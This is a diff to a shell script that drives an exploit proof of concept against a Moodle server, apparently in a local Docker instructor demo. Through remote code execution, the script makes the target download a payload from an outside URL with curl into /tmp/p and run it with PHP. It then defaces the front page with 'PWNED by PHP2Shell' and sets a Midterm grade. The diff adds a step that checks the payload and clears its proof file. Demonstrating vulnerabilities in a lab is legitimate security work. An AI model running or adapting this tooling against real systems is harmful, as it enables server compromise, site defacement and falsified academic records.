@@ -3,8 +3,8 @@
 #
 # `setup` is the only action that delivers the payload with a long command.
 # All visible effects use only `php /tmp/p <code>` (at most 14 bytes), sent
-# through the PoC. This script uses HTTP and the PoC only: never loot/ or
-# docker exec.
+# through the PoC. It never uses loot/; Docker is read only and supplies PHP
+# symbol offsets for the local PoC.
 set -u
 
 ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
@@ -29,11 +29,12 @@ usage() {
     cat <<'EOF'
 Usage: sh scripts/instructor-demo.sh [--dry-run] <action> [grade]
 
-Run `setup` once after starting Moodle. It downloads the instructor payload
-through the PoC. Each later effect sends only short commands through the PoC.
+Run `setup` once after starting Moodle. It downloads the instructor payload,
+executes a self-check through the PoC, reads its HTTP proof, and removes it.
+Each later effect sends only short commands through the PoC.
 
 Actions:
-  setup               install the payload, then clear the HTTP proof
+  setup               install and verify the payload, then clear the HTTP proof
   homepage            set the front-page name to PWNED by PHP2Shell
   reset-homepage      restore the previous front-page name
   grade <integer>     set the Midterm grade (0 through 1295)
@@ -93,13 +94,24 @@ download_payload() {
 run_short() {
     command=$1
     fetch=$2
-    python3 php2shell/exploit.py \
-        -u "$MOODLE_URL" \
-        --profile official83 \
-        --docker-container "$CONTAINER" \
-        --proof-file '' \
-        --fetch "$fetch" \
-        -c "$command" >/dev/null 2>&1
+    show_output=${3:-1}
+    if [ "$show_output" -eq 0 ]; then
+        python3 php2shell/exploit.py \
+            -u "$MOODLE_URL" \
+            --profile official83 \
+            --docker-container "$CONTAINER" \
+            --proof-file '' \
+            --fetch "$fetch" \
+            -c "$command" >/dev/null 2>&1
+    else
+        python3 php2shell/exploit.py \
+            -u "$MOODLE_URL" \
+            --profile official83 \
+            --docker-container "$CONTAINER" \
+            --proof-file '' \
+            --fetch "$fetch" \
+            -c "$command"
+    fi
 }
 
 run_plan() {
@@ -109,7 +121,9 @@ run_plan() {
     log "payload-install=run steps=$COUNT"
     printf '%s\n' "$PLAN" | while IFS= read -r step; do
         log "payload-install-step=$step"
-        run_short "$step" /index.php || {
+        # Every planned command leaves b in the web root. Fetching it gives
+        # exploit.py a small visible liveness proof without dumping /index.php.
+        run_short "$step" /b 0 || {
             log "payload-install-step=failed command=$step"
             exit 1
         }
@@ -117,9 +131,10 @@ run_plan() {
 }
 
 clear_proof() {
-    # Code 0 removes the proof. Fetching /index.php only tells the PoC when
-    # its request completed; the following HTTP request verifies the removal.
-    run_short 'php /tmp/p 0' /index.php || fail "proof-clear PoC failed"
+    show_output=${1:-1}
+    # b remains from setup's delivery plan and gives a compact liveness proof.
+    # The following HTTP request verifies that code 0 removed the old proof.
+    run_short 'php /tmp/p 0' /b "$show_output" || fail "proof-clear PoC failed"
     if curl --fail --silent --show-error --max-time 10 "$PROOF_URL" >/dev/null 2>&1; then
         fail "proof-clear did not remove the previous HTTP proof"
     fi
@@ -132,8 +147,26 @@ read_proof() {
 setup() {
     download_payload
     run_plan "curl -fsSL '${URL}' -o /tmp/p"
-    clear_proof
-    log "setup=ok payload=/tmp/p proof=cleared"
+    clear_proof 0
+    if ! run_short 'php /tmp/p 7' /demo-proof.txt 0; then
+        fail "payload self-check failed or produced no HTTP proof"
+    fi
+    if ! PROOF_TEXT=$(curl --fail --silent --show-error --max-time 10 "$PROOF_URL"); then
+        fail "payload self-check produced no HTTP proof"
+    fi
+    case "$PROOF_TEXT" in
+        *demo=failed*)
+            clear_proof 0
+            fail "payload self-check reported failure: $PROOF_TEXT"
+            ;;
+        *"payload-check=ok sha256=$EXPECTED_SHA"*) ;;
+        *)
+            clear_proof 0
+            fail "payload self-check returned invalid HTTP proof: $PROOF_TEXT"
+            ;;
+    esac
+    clear_proof 0
+    log "setup=ok payload=/tmp/p self-check=ok proof=cleared"
 }
 
 run_action() {
@@ -197,7 +230,8 @@ if [ "$DRY" -eq 1 ]; then
     printf 'payload URL: %s\n' "$URL"
     printf 'payload SHA-256: %s\n' "${DEMO_PAYLOAD_SHA256:-${LOCAL_SHA:-<local payload missing>}}"
     if [ "$ACTION_NAME" = setup ]; then
-        printf 'target setup: planned <=14-byte payload download, then php /tmp/p 0\n'
+        printf 'target setup: planned <=14-byte payload download, then php /tmp/p 0, 7, 0\n'
+        printf 'target self-check: payload-check=ok with matching SHA-256, then removed\n'
     else
         printf 'target action: php /tmp/p 0, then php /tmp/p %s\n' "$ACTION_CODE"
     fi
